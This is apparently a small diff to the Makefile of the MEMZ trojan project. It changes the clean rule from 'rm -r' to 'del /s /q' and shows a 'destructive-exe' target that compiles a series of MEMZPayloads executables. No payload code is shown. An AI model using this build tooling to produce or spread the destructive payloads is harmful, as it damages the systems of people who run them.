@@ -32,6 +32,6 @@ destructive-exe: dir $(CFILES) $(HFILES) $(BUILDDIR)/Data.c $(BUILDDIR)/Data.h
 	for /F "delims= " %%n in ('echo $(FNAMES)') do $(CC) $(CCFLAGS) $(CFILES) $(BUILDDIR)\Data.c $(LIBS) -o Build\Bin\MEMZPayloads-%%n.exe -DPL2=%%n
 	
 clean:
-	rm -r $(BUILDDIR)
+	del /s /q $(BUILDDIR)
 
 .PHONY: clean all dir destructive-exe
